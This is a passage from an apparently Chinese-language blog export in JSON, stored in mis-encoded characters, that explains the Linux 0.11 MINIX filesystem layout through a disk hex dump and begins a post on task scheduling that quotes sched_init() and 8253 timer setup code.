B\n0x5bd40de5  -\u003e  æ–‡ä»¶æœ€åä¿®æ”¹æ—¶é—´ä¸º Unix TimeStamp 1540623845 =\u003e 2018/10/27 15:4:5\n0x00    -\u003e  æ–‡ä»¶æ‰€åœ¨ç»„ id\n0x02    -\u003e  æœ‰ä¸¤ä¸ªæ–‡ä»¶ç›®å½•é¡¹æŒ‡å‘1å·ièŠ‚ç‚¹\n0x000a  -\u003e  1 å· i èŠ‚ç‚¹æŒ‡å‘çš„ç¬¬0å—æ•°æ®ä¸ºç¬¬10ä¸ªé€»è¾‘å—(å³ç¬¬1ä¸ªæ•°æ®å—)\n0x0000  =\u003e  ç”±äºæ•°æ®æ¯”è¾ƒå°ï¼Œåé¢çš„ i_zone[1] ~ i_zone[8] å‡ä¸º 0\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003ei_zone æŒ‡å‘çš„æ˜¯æ•°æ®å®é™…å­˜å‚¨çš„æ•°æ®å—çš„ä½ç½®ã€‚\u003c/p\u003e\n\u003cp\u003eä½†æ˜¯ï¼Œä»…ä»…åªæœ‰ 9 ä¸ªæŒ‡é’ˆï¼Œæ¯ä¸ªæ•°æ®å—èƒ½å­˜å‚¨ 1024 B ï¼Œæ˜¯è¿œè¿œè¾¾ä¸åˆ°ä¹‹å‰æ‰€æè¿°çš„å•æ–‡ä»¶ \u003ccode\u003e0x10081c00 = 268966912 B\u003c/code\u003e çš„ä¸Šé™çš„ã€‚\u003c/p\u003e\n\u003cp\u003eäº‹å®ä¸Šï¼Œminix åœ¨å®é™…å¤„ç†çš„è¿‡ç¨‹ä¸­ï¼ŒæŠŠå‰7ä¸ªæŒ‡é’ˆä½œä¸ºç›´æ¥æ•°æ®å—æŒ‡é’ˆï¼Œæœ€å¤šå­˜å‚¨ 7168 B æ•°æ®ã€‚\u003c/p\u003e\n\u003cp\u003ei_zone[7] è¡¨ç¤ºä¸€æ¬¡é—´æ¥æŒ‡é’ˆï¼ŒæŒ‡å‘æŸä¸€ä¸ªæ•°æ®å—ï¼Œä½†æ˜¯è¯¥æ•°æ®å—æ¯2å­—èŠ‚ä½œä¸ºä¸€ä¸ªæŒ‡é’ˆï¼ŒæŒ‡å‘çœŸæ­£çš„æ•°æ®å—ã€‚\u003c/p\u003e\n\u003cp\u003ei_zone[8] è¡¨ç¤ºäºŒæ¬¡é—´æ¥æŒ‡é’ˆã€‚\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://ws3.sinaimg.cn/large/006tNbRwly1fwnu3zrwuij310y0m6abj.jpg\"\u003e\nCopied from Linux å†…æ ¸å®Œå…¨æ³¨é‡ŠV3.0\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eæ•°æ®å—\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003eæœ€åï¼Œæˆ‘ä»¬çœ‹çœ‹æ•°æ®å—çš„å†…å®¹ï¼Œä¹Ÿå¸Œæœ›èƒ½å¤Ÿæ›´å¥½åœ°æ¥ç†è§£ Linux ç›®å½•å’Œæ–‡ä»¶çš„å¼‚åŒã€‚\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e00002800  01 00 2e 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n00002810  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n00002820  01 00 2e 2e 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n00002830  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n00002840  02 00 68 65 6c 6c 6f 2e  63 00 00 00 00 00 00 00  |..hello.c.......|\n00002850  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n*\n00002c00  23 69 6e 63 6c 75 64 65  20 3c 73 74 64 69 6f 2e  |#include \u0026#x3C;stdio.|\n00002c10  68 3e 0a 00 00 00 00 00  00 00 00 00 00 00 00 00  |h\u003e..............|\n00002c20  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eåœ¨ièŠ‚ç‚¹åŒºå—ä¸Šï¼Œæˆ‘ä»¬çœ‹åˆ°æœ‰1å·ièŠ‚ç‚¹å’Œ2å·ièŠ‚ç‚¹å·²ç»è¢«ä½¿ç”¨äº†ã€‚\u003c/p\u003e\n\u003cp\u003e0x2800 ~ 0x2860 çš„ä½ç½®è¡¨ç¤ºçš„å°±æ˜¯ 1 å·ièŠ‚ç‚¹çš„æ•°æ®ã€‚äº‹å®ä¸Šè¿™æ˜¯ä¸€ä¸ªç›®å½•(å½“ç„¶ï¼Œæ€ä¹ˆåŒºåˆ†ç›®å½•è¿˜æ˜¯æ–‡ä»¶ï¼Œåœ¨ièŠ‚ç‚¹åŒºå—çš„ i_mode å­—æ®µå·²ç»æè¿°è¿‡äº†)\u003c/p\u003e\n\u003cp\u003eå¯¹äºç›®å½•æ–‡ä»¶ï¼Œå½“ç„¶æ˜¯ç”¨æ¥è®°è½½ç›®å½•é¡¹çš„ï¼Œæ¯ä¸ªç›®å½•é¡¹å ç”¨ 32 å­—èŠ‚ã€‚\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003eè¿™é‡Œéœ€è¦è¿›è¡Œè¯´æ˜ï¼ŒMINIX 1.0 ç‰ˆæœ¬çš„æ–‡ä»¶ç³»ç»Ÿä¼¼ä¹æ˜¯å¯¹æ¯ä¸ªç›®å½•é¡¹å ç”¨ 16 å­—èŠ‚çš„ã€‚\u003c/p\u003e\n\u003cp\u003eè¿™é‡Œæä¾›ä¸€ä¸ª Linux 0.11 ç‰ˆæœ¬çš„ä»¿çœŸè¿è¡Œç»“æœä»¥ä¾›è¯æ˜\n\u003cimg src=\"https://ws4.sinaimg.cn/large/006tNbRwly1fwnuexcwx7j30nw0c8745.jpg\"\u003e\u003c/p\u003e\n\u003cp\u003eä¸Šé¢æè¿°çš„ \u003ccode\u003edisk.img\u003c/code\u003e æ˜¯åœ¨ Ubuntu 16.04 LTS ä¸‹è·‘å‡ºæ¥çš„ç»“æœï¼Œæ‰€æœ‰ç¡®å®å‡ºç°äº†ä¸€äº›å·®åˆ«ã€‚\nè‡³äºå…·ä½“çš„ä¸€ä¸ªè§„èŒƒï¼Œç›®å‰è¿˜æ²¡æœ‰æ‰¾åˆ°ï¼Œæ‰€æœ‰è¿™éƒ¨åˆ†åªèƒ½åšæ¨¡ç³Šå¤„ç†äº†ï¼Œå‹¿æ€ªã€‚\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003eå‰2ä¸ªå­—èŠ‚ç”¨æ¥è¡¨ç¤ºè¯¥ç›®å½•é¡¹æ‰€å¯¹åº”çš„ i èŠ‚ç‚¹ç¼–å·ã€‚ä¹‹åçš„30ä¸ªå­—èŠ‚ç”¨æ¥æè¿°è¯¥ç›®å½•é¡¹çš„åå­—ã€‚\u003c/p\u003e\n\u003cp\u003eå› æ­¤ï¼Œå¯¹ 0x2800 ~ 0x2860 çš„æ•°æ®è¿›è¡Œé‡å»ºçš„ç»“æœå°±æ˜¯ \u003ccode\u003e. .. hello.c\u003c/code\u003e ä¸‰ä¸ªç›®å½•é¡¹äº†ã€‚å…¶ä¸­ï¼Œç”±äºæ˜¯æ ¹ç›®å½•ï¼Œ\u003ccode\u003e.\u003c/code\u003e å’Œ \u003ccode\u003e..\u003c/code\u003e æ‰€æŒ‡å‘çš„ièŠ‚ç‚¹çš„ç›¸åŒçš„ï¼Œéƒ½æ˜¯1å·ièŠ‚ç‚¹ã€‚\u003c/p\u003e\n\u003cp\u003eè€Œ hello.c æ–‡ä»¶æŒ‡å‘çš„æ˜¯ 2 å·ièŠ‚ç‚¹ã€‚\u003c/p\u003e\n\u003cp\u003eå“ˆå“ˆï¼Œ2å·ièŠ‚ç‚¹çš„æ•°æ®å†…å®¹å°±åœ¨ 0x2c00 å¼€å§‹çš„ä½ç½®ã€‚é€šè¿‡å³ä¾§çš„ ASCII ç»“æœæˆ‘ä»¬ä¹Ÿå¯ä»¥çœ‹åˆ°ã€‚\u003c/p\u003e\n\u003cp\u003eå½“ç„¶ï¼Œä¹‹å‰è¯´è¿‡æ¯ä¸ªæ•°æ®å—æ˜¯ 1024 B ï¼Œé‚£ä¹ˆæ•°æ®å—å¤šä½™çš„éƒ¨åˆ†ï¼Œå°±æ˜¯ç•™ç©ºå’¯ï¼Œè€Œä¸ä¼šè¢«å…¶å®ƒièŠ‚ç‚¹å ç”¨(é™¤éè¯¥æ–‡ä»¶orç›®å½•è¢«å®Œå…¨ç§»é™¤äº†)\u003c/p\u003e\n\u003ch2\u003eå°ç»“\u003c/h2\u003e\n\u003cp\u003eåˆ°æ­¤ä¸ºæ­¢ï¼Œæ–‡ä»¶ç³»ç»Ÿå®è§‚çš„æè¿°å°±å·²ç»å®Œç»“äº†ã€‚\u003c/p\u003e\n\u003cp\u003eä¸‹ä¸€èŠ‚å°†å¯¹æ“ä½œç³»ç»Ÿå¦‚ä½•ä½¿ç”¨æ–‡ä»¶ç³»ç»Ÿè¿›è¡Œæè¿°ã€‚\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-plain\"\u003e  __                    __                  \n / _| __ _ _ __   __ _ / _| ___ _ __   __ _ \n| |_ / _` | '_ \\ / _` | |_ / _ \\ '_ \\ / _` |\n|  _| (_| | | | | (_| |  _|  __/ | | | (_| |\n|_|  \\__,_|_| |_|\\__, |_|  \\___|_| |_|\\__, |\n                 |___/                |___/ \n\u003c/code\u003e\u003c/pre\u003e","digest":"\u003cp\u003eç”¨æƒ¯äº†ç±» Unix ç³»ç»Ÿï¼Œåº”è¯¥è¯´æ–‡ä»¶ç³»ç»Ÿæ˜¯æ—¥å¸¸æœ€å¸¸æ¥è§¦çš„ä¸€ä¸ªæ“ä½œç³»ç»Ÿæ¨¡å—ä¹‹ä¸€äº†ã€‚\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-shell\"\u003e$ ls\nApplications Network      Users        bin          data         etc          net          sbin         usr\nLibrary      System       Volumes      cores        dev          home         private      tmp          var\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eä½†æ˜¯ï¼Œç©¶ç«Ÿä»€ä¹ˆæ˜¯æ–‡ä»¶ç³»ç»Ÿ? ä¸ºä»€ä¹ˆéœ€è¦æ–‡ä»¶ç³»ç»Ÿ? éš¾é“æ–‡ä»¶ä¸æ˜¯ç®€å•åœ°å­˜å‚¨åˆ°å­˜å‚¨è®¾å¤‡ä¸€å—è¿ç»­åŒºåŸŸçš„å—?\u003c/p\u003e"},{"url":"2018-10-12-understand-Kernel-4","fileName":"2018-10-12-understand-Kernel-4.md","title":"ç†è§£ Linux Kernel (4) - ä»»åŠ¡è°ƒåº¦","author":"fangfeng","date":"2018-10-12T00:00:00.000Z","tags":["Kernel","Linux","time interrupt"],"content":"\u003cp\u003eå‰é¢å‡ èŠ‚å·²ç»æè¿°è¿‡ï¼Œå¯¹äºå•æ ¸ CPU æ¥è¯´ã€‚CPU å°±å¤„äºä¸æ–­åœ°æ‰§è¡ŒæŒ‡ä»¤çš„è¿‡ç¨‹(æˆ–è€…é€šè¿‡ \u003ccode\u003ehlt\u003c/code\u003e æŒ‡ä»¤ç›´æ¥åœæ­¢å·¥ä½œ)ã€‚\u003c/p\u003e\n\u003cp\u003eé’ˆå¯¹äºæ¯ä¸€ä¸ªç¨‹åºæ¥è¯´ï¼Œè¿™ä¸ªç¨‹åºæ‰§è¡Œæµç¨‹æ˜¯é€šè¿‡ CPU ä¸­å‡ ç»„å¯„å­˜å™¨(é€šç”¨å¯„å­˜å™¨ã€æ®µå¯„å­˜å™¨ã€æ§åˆ¶å¯„å­˜å™¨ç­‰) å’Œå­˜å‚¨åœ¨å†…å­˜ä¸­çš„ä»£ç å’Œæ•°æ®åä½œå®Œæˆçš„ã€‚\u003c/p\u003e\n\u003cp\u003eå¦‚æœè¦è¾¾åˆ°å•æ ¸å¤šä»»åŠ¡çš„ç›®çš„ï¼Œé¦–å…ˆè¦åšçš„å°±æ˜¯å®Œæˆå¯¹å‡ ç»„å¯„å­˜å™¨ä¸­å½“å‰å€¼çš„ä¿å­˜(æˆ‘ç§°ä¹‹ä¸ºä¿å­˜ç°åœº)ã€‚è€Œå¯¹äºå†…å­˜æ¥è¯´ï¼Œå¤šä¸ªä»»åŠ¡çš„ä»£ç ã€æ•°æ®åŒæ—¶å­˜åœ¨å†…å­˜æ˜¯å®Œå…¨åˆç†ä¸”å¯è¡Œçš„ã€‚æ¯•ç«Ÿç›¸è¾ƒäºæœ‰é™çš„å¯„å­˜å™¨ï¼Œå†…å­˜å®åœ¨æ˜¯å¤ªå¤§äº†(ç›¸å¯¹è€Œè¨€)ã€‚\u003c/p\u003e\n\u003ch2\u003eä»»åŠ¡è°ƒåº¦çš„å®è§‚æè¿°\u003c/h2\u003e\n\u003cp\u003eä»å®è§‚ä¸Šæ¥è¯´ï¼Œæ“ä½œç³»ç»Ÿç»´æŠ¤äº†è‹¥å¹²ä¸ªä»»åŠ¡(å‡è®¾æœ‰ 0, 1, 5, 6)ã€‚\u003c/p\u003e\n\u003cp\u003eä¸‹é¢ä»¥ä¸€ä¸ªå‡è±¡çš„ä¾‹å­æ¥å¯¹ä»»åŠ¡è°ƒåº¦åšä¸€äº›å½¢è±¡çš„è¯´æ˜:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003eå‡è®¾å½“å‰ä»»åŠ¡æ˜¯ä»»åŠ¡ 5 ï¼Œæ“ä½œç³»ç»Ÿåˆ†é…ç»™å®ƒçš„ CPU ä½¿ç”¨æ—¶é—´æ˜¯ 30msã€‚\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eæ¯ 10ms è®¡æ—¶å™¨(Intel 8253, å¯ç¼–ç¨‹è®¡æ•°å™¨/å®šæ—¶å™¨) å‘ CPU å‘èµ·ä¸€ä¸ªæ—¶é’Ÿä¸­æ–­ã€‚\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eCPU å¼€å§‹å¤„ç†æ—¶é’Ÿä¸­æ–­(æ­¤æ—¶æ˜¯\u003cstrong\u003eå†…æ ¸æ€\u003c/strong\u003e)ã€‚å½“å‰ä»»åŠ¡å‰©ä½™å¯ç”¨æ—¶é—´ -10msã€‚\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eæ£€æŸ¥å½“å‰ä»»åŠ¡çš„å‰©ä½™æ—¶é—´ç‰‡ï¼Œæœ‰å‰©ä½™ -\u003e æ­¥éª¤ 5 ; å¦åˆ™ -\u003e æ­¥éª¤ 6 \u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eç›´æ¥é€€å‡ºå¯¹æ—¶é’Ÿä¸­æ–­çš„å¤„ç†å‡½æ•°(å›åˆ° \u003cstrong\u003eç”¨æˆ·æ€\u003c/strong\u003e), é‡å¤æ­¥éª¤ 1 \u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eæ ¹æ®æ¯ä¸ªä»»åŠ¡çš„ä¼˜å…ˆçº§åŠå…¶å®ƒä¸€äº›å› ç´ ç¡®å®šæŠŠæ¥ä¸‹æ¥çš„ä¸€æ®µæ—¶é—´åˆ†é…ç»™å“ªä¸ªä»»åŠ¡ã€‚(å‡è®¾åˆ†é…ç»™ä»»åŠ¡ 6 ï¼Œ30ms çš„ CPU ä½¿ç”¨æ—¶é—´) -\u003e é‡å¤æ­¥éª¤ 2 ã€‚\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003eå½“ç„¶ï¼Œä¸Šé¢çš„æè¿°ä¸­å¿½ç•¥äº†å¾ˆå¤šçš„å› ç´ ã€‚\u003c/p\u003e\n\u003ch2\u003eä»»åŠ¡è°ƒåº¦å‡†å¤‡é˜¶æ®µ\u003c/h2\u003e\n\u003cp\u003eè¿™é‡Œéƒ½å°†ä»¥ Linux 0.11 ç‰ˆæœ¬ä»£ç ä½œä¸ºå®ä¾‹ã€‚å½“ç„¶ï¼Œå…¶ä¸­ä¸€äº›ä»£ç ä¸ºäº†é€‚åº”ç°åœ¨çš„ GCC åšäº†ä¸€äº›ä¿®æ”¹ï¼Œå¦å¤–è¿˜å¯èƒ½ç›´æ¥æ‘†å‡º GCC ç¼–è¯‘åçš„æ±‡ç¼–ä»£ç æ¥è§£é‡Šè¯´æ˜ã€‚\u003c/p\u003e\n\u003cp\u003eé¦–å…ˆï¼Œå†…æ ¸ä»£ç åœ¨ç»è¿‡ä¸€ç³»åˆ—çš„å‡†å¤‡æµç¨‹(åŒ…æ‹¬è®¾ç½®ä¸€äº›å¯„å­˜å™¨ä»¥åŠåœ¨å†…å­˜ä¸­æš‚å­˜æŸäº›å€¼ï¼Œè¯»å–è®¡ç®—æœºçš„ç¡¬ä»¶é…ç½®ç­‰)ã€‚çœŸæ­£å¼€å§‹å‡ºç°ä»»åŠ¡ 0 å§‹äºä¸‹åˆ—è¿™æ®µä»£ç :\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-c\"\u003e/* æ¥è‡ª Linux0.11 init/main.c */\nvoid main(void) \n{\n    ...\n\n    sched_init();       /* schedule, é¡¾åæ€ä¹‰å°±æ˜¯æ—¶é—´å®‰æ’å’¯ */\n    \n    ...\n    sti();\n    move_to_user_mode();\n    if (!fork()) {  \n        init();\n    }\n    for(;;) pause();\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eåœ¨æ“ä½œç³»ç»Ÿçš„ä¸»å‡½æ•°ä¸­ï¼Œå¼€å§‹å¯¹ä»»åŠ¡è°ƒåº¦è¿›è¡Œä¸€å®šçš„å‡†å¤‡å·¥ä½œã€‚çœ‹çœ‹å…·ä½“ä»£ç å§\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-c\"\u003e/* è¿™é‡Œç»™å‡ºçš„æ˜¯ Linux0.11 kernel/sched.c ç»è¿‡é¢„ç¼–è¯‘çš„å‡½æ•°(é‡Œé¢æœ‰ä¸€äº›å†…è”æ±‡ç¼–) */\nvoid sched_init(void)\n{\n    int i;\n    struct desc_struct * p;    /* å£°æ˜ä¸€ä¸ªæè¿°ç¬¦æŒ‡é’ˆ */\n\n    if (sizeof(struct sigaction) != 16)\n        panic(\"Struct sigaction MUST be 16 bytes\");\n    __asm__ (                           /* è¿™æ®µæ˜¯ä¸ºäº†è®¾ç½®å…¨å±€æè¿°ç¬¦è¡¨GDTçš„ç¬¬4é¡¹ï¼Œæ˜¯ä¸€ä¸ª 0 å·ä»»åŠ¡(å½“å‰ä»»åŠ¡)çš„ä»»åŠ¡è°ƒç”¨é—¨*/\n            \"movw $104,%1\\n\\t\" \n            \"movw %%ax,%2\\n\\t\" \n            \"rorl $16,%%eax\\n\\t\" \n            \"movb %%al,%3\\n\\t\" \n            \"movb $\" \"0x89\" \",%4\\n\\t\" \n            \"movb $0x00,%5\\n\\t\" \n            \"movb %%ah,%6\\n\\t\" \n            \"rorl $16,%%eax\" \n            ::\"a\" (\u0026#x26;(init_task.task.tss)), \"m\" (*(((char *) (gdt+4)))), \"m\" (*(((char *) (gdt+4))+2)), \"m\" (*(((char *) (gdt+4))+4)), \"m\" (*(((char *) (gdt+4))+5)), \"m\" (*(((char *) (gdt+4))+6)), \"m\" (*(((char *) (gdt+4))+7)) \n            );\n    __asm__ (                           /* è¿™é‡Œè®¾ç½®å…¨å±€æè¿°ç¬¦è¡¨çš„ç¬¬5é¡¹ï¼Œ0å·ä»»åŠ¡çš„å±€éƒ¨æè¿°ç¬¦è¡¨åŸºå€é€‰æ‹©ç¬¦ */\n            \"movw $104,%1\\n\\t\" \n            \"movw %%ax,%2\\n\\t\" \n            \"rorl $16,%%eax\\n\\t\" \n            \"movb %%al,%3\\n\\t\" \n            \"movb $\" \"0x82\" \",%4\\n\\t\" \n            \"movb $0x00,%5\\n\\t\" \n            \"movb %%ah,%6\\n\\t\" \n            \"rorl $16,%%eax\" \n            ::\"a\" (\u0026#x26;(init_task.task.ldt)), \"m\" (*(((char *) (gdt+(4 +1))))), \"m\" (*(((char *) (gdt+(4 +1)))+2)), \"m\" (*(((char *) (gdt+(4 +1)))+4)), \"m\" (*(((char *) (gdt+(4 +1)))+5)), \"m\" (*(((char *) (gdt+(4 +1)))+6)), \"m\" (*(((char *) (gdt+(4 +1)))+7)) \n            );\n    p = gdt+2+4;        /* æè¿°ç¬¦æŒ‡é’ˆæŒ‡å‘ GDT ç¬¬6é¡¹ã€‚å› ä¸ºå‰é¢å·²ç»å ç”¨äº†ç¬¬4ï¼Œ5é¡¹ã€‚ç”±å†…æ ¸å ç”¨äº† 0ï¼Œ1ï¼Œ2ï¼Œ3ã€‚*/\n    for(i=1;i\u0026#x3C;64;i++) {         /* å¾ªç¯ 63 æ¬¡ï¼Œè¿™æ˜¯ Linux0.11 æœ€å¤§æ”¯æŒ 64 ä¸ªä»»åŠ¡åŒæ—¶å­˜åœ¨ã€‚å½“å‰ä»»åŠ¡å·²ç»å äº†ä¸€ä¸ªä»»åŠ¡äº†*/\n        task[i] = ((void *) 0); /* 63ä¸ªä»»åŠ¡æŒ‡é’ˆå…¨éƒ¨å€¼ä¸º NULL */\n        p-\u003ea=p-\u003eb=0;            /* GDT ç´¯ç§¯ 126 é¡¹(126 * 8 å­—èŠ‚)å…¨éƒ¨ç½®ä¸º 0 ã€‚æ¯ä¸ªä»»åŠ¡å ç”¨ GDT ä¸¤é¡¹ï¼Œä¸€ä¸ºä»»åŠ¡é—¨ï¼Œä¸€ä¸ºå±€éƒ¨æè¿°ç¬¦è¡¨é€‰æ‹©ç¬¦*/\n        p++;\n        p-\u003ea=p-\u003eb=0;\n        p++;\n    }\n\n    __asm__(\"pushfl ; andl $0xffffbfff,(%esp) ; popfl\");\n    __asm__(\"ltr %%ax\"::\"a\" (((((unsigned long) 0)\u0026#x3C;\u0026#x3C;4)+(4\u0026#x3C;\u0026#x3C;3))));           /* load Task Register TR è®°å½•å½“å‰ä»»åŠ¡é—¨ä¸º gdt ç¬¬4é¡¹ */\n    __asm__(\"lldt %%ax\"::\"a\" (((((unsigned long) 0)\u0026#x3C;\u0026#x3C;4)+((4 +1)\u0026#x3C;\u0026#x3C;3))));     /* load Local Descriptor Table Register LDTR è®°å½•å½“å‰é€‰æ‹©ç¬¦ä¸º gdt ç¬¬5é¡¹ */\n    /* ç»™8253èŠ¯ç‰‡ç¼–ç¨‹ï¼Œæ¯ 10ms å‘èµ·ä¸€æ¬¡æ—¶é’Ÿä¸­æ–­(ä¸‹é¢3è¡Œçš„å·¥ä½œ) */\n    __asm__ (\"outb %%al,%%dx\\n\" \"\\tjmp 1f\\n\" \"1:\\tjmp 1f\\n\" \"1:\"::\"a\" (0x36),\"d\" (0x43));   \n    __asm__ (\"outb %%al,%%dx\\n\" \"\\tjmp 1f\\n\" \"1:\\tjmp 1f\\n\" \"1:\"::\"a\" ((1193180/100) \u0026#x26; 0xff),\"d\" (0x40));\n    __asm__ (\"outb %%al,%%dx\"::\"a\" ((1193180/100) \u003e\u003e 8),\"d\" (0x40));\n    __asm__ (\"movw %%dx,%%ax\\n\\t\" \"movw %0,%%dx\\n\\t\" \"movl %%eax,%1\\n\\t\" \"movl %%edx,%2\" : : \"i\" ((short) (0x8000+(0\u0026#x3C;\u0026#x3C;13)+(14\u0026#x3C;\u0026#x3C;8))), \"o\" (*((char *) (\u0026#x26;idt[0x20]))), \"o\" (*(4+(char *) (\u0026#x26;idt[0x20]))), \"d\" ((char *) (\u0026#x26;timer_interrupt)),\"a\" (0x00080000)); /* åœ¨ IDT ä¸­è®¾ç½®æ—¶é’Ÿä¸­æ–­æè¿°ç¬¦é¡¹ï¼Œç¬¬32é¡¹ä¸ºæ—¶é’Ÿä¸­æ–­*/\n    __asm__ (\"outb %%al,%%dx\"::\"a\" (({ unsigned char _v; __asm__ volatile (\"inb %%dx,%%al\\n\" \"\\tjmp 1f\\n\" \"1:\\tjmp 1f\\n\" \"1:\":\"=a\" (_v):\"d\" (0x21)); _v; })\u0026#x26;~0x01),\"d\" (0x21)); /*é‡æ–°è®¾ç½®æ—¶é’Ÿä¸­æ–­çš„å¯å±è”½å±æ€§ï¼Œè¿™æ ·å°±å¯åœ¨è°ƒç”¨ hlt åè¢«æ—¶é’Ÿä¸­æ–­å”¤é†’ */\n    __asm__ (\"movw %%dx,%%ax\\n\\t\" \"movw %0,%%dx\\n\\t\" \"movl %%eax,%1\\n\\t\" \"movl %%edx,%2\" : : \"i\" ((short) (0x8000+(3\u0026#x3C;\u0026#x3C;13)+(15\u0026#x3C;\u0026#x3C;8))), \"o\" (*((char *) (\u0026#x26;idt[0x80]))), \"o\" (*(4+(char *) (\u0026#x26;idt[0x80]))), \"d\" ((char *) (\u0026#x26;system_call)),\"a\" (0x00080000)); /* åœ¨ IDT ä¸­è®¾ç½®ç³»ç»Ÿä¸­æ–­ï¼Œç¬¬128é¡¹ä¸ºæ—¶é’Ÿä¸­æ–­ */\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eé€šè¿‡æ‰§è¡Œ \u003ccode\u003esched_init()\u003c/code\u003e ï¼Œæ“ä½œç³»ç»Ÿå¼€å§‹æœ‰äº†ä»»åŠ¡çš„æ¦‚å¿µã€‚å¹¶ä¸”æŠŠå½“å‰ä»»åŠ¡ä½œä¸ºä»»åŠ¡ 0 æ¥åŠ ä»¥è®¤è¯†ã€‚\u003c/p\u003e\n\u003cp\u003eåŒæ—¶ï¼Œé¢„ç½®äº† 64 ä¸ªä»»åŠ¡çŠ¶æ€æ•°ç»„ï¼Œç”¨æ¥è¾…åŠ©ä»»åŠ¡è°ƒåº¦å™¨å®Œæˆæœªæ¥è°ƒåº¦ä»»åŠ¡æ—¶ç¡®è®¤ç›®å‰æ‰€æœ‰ä»»åŠ¡çš„åŸºç¡€æ€§æ”¯æŒã€‚\u003c/p\u003e\n\u003cp\u003eæœ€é‡è¦çš„ï¼Œå½“ç„¶æ˜¯å¯¹ 8253 èŠ¯ç‰‡çš„ç¼–ç¨‹ï¼Œä½¿å…¶æ¯ 10ms å‘ CPU å‘èµ·ä¸€ä¸ªç¡¬ä»¶æ—¶é’Ÿä¸­æ–­ã€‚ç”±æ­¤å°†æŠŠç³»ç»Ÿæš‚æ—¶æ€§çš„å¸¦å…¥\u003cstrong\u003eå†…æ ¸æ€\u003c/strong\u003e æ¥å®Œæˆ CPU ä¸‹ä¸€ä¸ª 10ms éœ€è¦è¿›è¡Œçš„ä»»åŠ¡çš„å†³ç­–å·¥ä½œã€‚\u003c/p\u003e\n\u003cp\u003eæœ€åçš„è®¾ç½®æ—¶é’Ÿä¸­æ–­æè¿°ç¬¦å’Œç³»ç»Ÿä¸­æ–­æè¿°ç¬¦è‡ªä¸ç”¨è¯´ã€‚ä¸è®¾ç½®çš„è¯ï¼Œå¯¹äºæ¥æ”¶åˆ°çš„ä¸­æ–­æ ¹æœ¬å°±æ²¡åŠæ³•ç¡®è®¤å¤„ç†ä¸­æ–­çš„ä»£ç åœ¨å“ª(æ¯•ç«Ÿä¸­æ–­å¤„ç†é€»è¾‘ä¹Ÿæ˜¯ç”± CPU æ‰§è¡ŒæŒ‡ä»¤æ¥è§£å†³çš„)\u003c/p\u003e\n\u003ch2\u003eä»»åŠ¡è°ƒåº¦å®æ–½é˜¶æ®µ\u003c/h2\u003e\n\u003cp\u003eç”±äºæ—¶é’Ÿä¸­æ–­æ˜¯ç”±ç¡¬ä»¶èŠ¯ç‰‡è¿›è¡Œæ§åˆ¶ï¼Œæ ¹æœ¬ä¸ä¼šé¡¾åŠå½“å‰ CPU æ­£åœ¨æ‰§è¡Œçš„ä»»åŠ¡å·²ç»æ‰§è¡Œåˆ°äº†å“ªä¸ªæŒ‡ä»¤ (å“ˆå“ˆï¼Œè¿™ä¸å¾—æ˜¯å½“ç„¶çš„å˜›ï¼Œä¸ç„¶è¦ä»»åŠ¡è°ƒåº¦åšä»€ä¹ˆï¼Œæ‰€æœ‰ä»»åŠ¡æµæ°´çº¿ä½œä¸šå¾—äº†)ã€‚\u003c/p\u003e\n\u003cp\u003eå› æ­¤ï¼Œä¸‹é¢çš„æè¿°å°†å€Ÿç€ä¸€æ¬¡æ—¶é’Ÿä¸­æ–­ï¼Œæ¥çœ‹ä¸€ä¸‹æ•´ä¸€ä¸ªä»»åŠ¡è°ƒåº¦æ“ä½œã€‚\u003c/p\u003e\n\u003ch3\u003eå®šä½æ—¶é’Ÿä¸­æ–­å¤„ç†é€»è¾‘\u003c/h3\u003e\n\u003cp\u003eIntel 8253èŠ¯ç‰‡å‘èµ·æ—¶é’Ÿä¸­æ–­ä¹‹åï¼ŒCPU ç«‹å³å¼€å§‹å¤„ç†è¯¥ä¸­æ–­\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003eé€šè¿‡ IDTR èŠ¯ç‰‡æŸ¥æ‰¾ä¸­æ–­æè¿°ç¬¦è¡¨(IDT, æœ€å¤š256é¡¹ï¼Œæ¯é¡¹8å­—èŠ‚) çš„åŸºå€ã€‚\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eç»“åˆä¸­æ–­å·ä½œä¸ºåç§»é‡ï¼Œå®šä½è¡¨ä¸­æŸä¸€é¡¹å…·ä½“çš„ä¸­æ–­æè¿°ç¬¦ (æ—¶é’Ÿä¸­æ–­æ˜¯0x20ï¼Œå› æ­¤åç§»å°±æ˜¯ 0x20 * 8 = 256)\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e\u003cimg 